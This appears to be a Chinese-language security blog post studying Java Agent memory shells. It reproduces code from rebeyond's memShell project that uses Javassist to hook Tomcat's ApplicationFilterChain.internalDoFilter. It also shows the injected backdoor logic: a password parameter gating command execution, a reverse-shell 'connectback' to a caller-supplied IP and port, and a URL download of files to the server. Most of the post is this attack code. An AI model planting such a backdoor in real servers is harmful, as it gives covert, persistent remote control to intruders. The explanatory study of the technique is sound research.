---
title: Agent 内存马
categories:
- Network_Security
- Web
- Java_Security
- Memory_Trojan
tags:
- Java
- Serialization
---

# Agent 内存马

1. 有关 Agent 和 Javassist 的相关知识在上文中提到。

2. 主要参考文章：

    > https://su18.org/post/memory-shell/#java-agent-%E5%86%85%E5%AD%98%E9%A9%AC

## 1. 案例一

1. Behinder 冰蝎作者 rebeyond 师傅，[他的项目](https://github.com/rebeyond/memShell)提出了这种想法，在这个项目中，他 hook 了 Tomcat 的 ApplicationFilterChain 的 `internalDoFilter`方法。
    ```java
    package net.rebeyond.memshell;
    import java.io.BufferedReader;
    import java.io.File;
    import java.io.FileReader;
    import java.io.InputStream;
    import java.io.InputStreamReader;
    import java.lang.instrument.ClassFileTransformer;
    import java.lang.instrument.IllegalClassFormatException;
    import java.security.ProtectionDomain;
    
    import javassist.ClassClassPath;
    import javassist.ClassPool;
    import javassist.CtClass;
    import javassist.CtMethod;
    
    public class Transformer implements ClassFileTransformer{
        @Override
        public byte[] transform(ClassLoader classLoader, String s, Class<?> aClass, ProtectionDomain protectionDomain, byte[] bytes) throws IllegalClassFormatException {
            if ("org/apache/catalina/core/ApplicationFilterChain".equals(s)) {
                try {
                    // 使用 Javassist，从 ApplicationFilterChain 入手，拿到其中的 internalDoFilter()
                    ClassPool cp = ClassPool.getDefault();
                    ClassClassPath classPath = new ClassClassPath(aClass);  //get current class's classpath
                    cp.insertClassPath(classPath);  //add the classpath to classpool
                    CtClass cc = cp.get("org.apache.catalina.core.ApplicationFilterChain");
                    CtMethod m = cc.getDeclaredMethod("internalDoFilter");
    
                    // 直接在方法内创建新变量 elapsedTime
                    m.addLocalVariable("elapsedTime", CtClass.longType);
                    // 在已经存在的方法前插入代码片段。readSource() 获取要插入的代码
                    m.insertBefore(readSource());
                    byte[] byteCode = cc.toBytecode();
                    cc.detach();
                    return byteCode;
                } catch (Exception ex) {
                	ex.printStackTrace();
                    System.out.println("error:::::"+ex.getMessage());
                }
            }
    
            return null;
        }
        public String readSource() {
        	StringBuilder source=new StringBuilder();
            InputStream is = Transformer.class.getClassLoader().getResourceAsStream("source.txt");
            InputStreamReader isr = new InputStreamReader(is); 
            String line=null;
            try {
                BufferedReader br = new BufferedReader(isr);
                while((line=br.readLine()) != null) {
                	source.append(line);
                }
            } catch (Exception e) {
                e.printStackTrace();
            } 
            return source.toString();
        }
    }
    ```

    只要发起请求，那么在 Tomcat 的环境下，`ApplicationFilterChain` 的 `internalDoFilter()` 基本是必定执行的。

2. 可以看一下其插入的一些逻辑：
    ```java
    	javax.servlet.http.HttpServletRequest request=$1;
    	javax.servlet.http.HttpServletResponse response = $2;
    	String pass_the_world=request.getParameter("pass_the_world");
    	String model=request.getParameter("model");
    	String result="";
    
    try {
    			if (pass_the_world!=null&&pass_the_world.equals(net.rebeyond.memshell.Agent.password))
    			{
    				if (model==null||model.equals(""))
    				{
    					result=net.rebeyond.memshell.Shell.help();
    				}
    				else if (model.equalsIgnoreCase("exec"))
    				{
    					String cmd=request.getParameter("cmd");
    					result=net.rebeyond.memshell.Shell.execute(cmd);
    				}
    				else if (model.equalsIgnoreCase("connectback"))
    				{
    					String ip=request.getParameter("ip");
    					String port=request.getParameter("port");
    					result=net.rebeyond.memshell.Shell.connectBack(ip, port);
    				}
    				else if (model.equalsIgnoreCase("urldownload"))
    				{
    					String url=request.getParameter("url");
    					String path=request.getParameter("path");
    					result=net.rebeyond.memshell.Shell.urldownload(url, path);
    				}
    				...
    ```

    基本就是根据请求的内容来调用相应的方法，`net.rebeyond.memshell.Shell` 是作者编写的工具类。
